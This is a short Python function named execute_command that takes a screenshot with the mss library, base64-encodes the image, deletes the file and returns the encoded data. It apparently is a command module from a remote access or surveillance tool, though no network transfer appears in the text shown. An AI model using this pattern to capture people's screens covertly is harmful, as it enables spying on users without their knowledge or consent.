def execute_command():
    from mss import mss
    import os
    import base64
    ## Take screenshot
    with mss() as sct:
        filename = sct.shot()

    image_path = os.path.join(os.getcwd(),filename)
    if os.path.isfile(image_path):
        content = open(image_path,"rb").read()
        enc_content = base64.b64encode(content)
        os.remove(image_path)
        return enc_content
    else:
        return False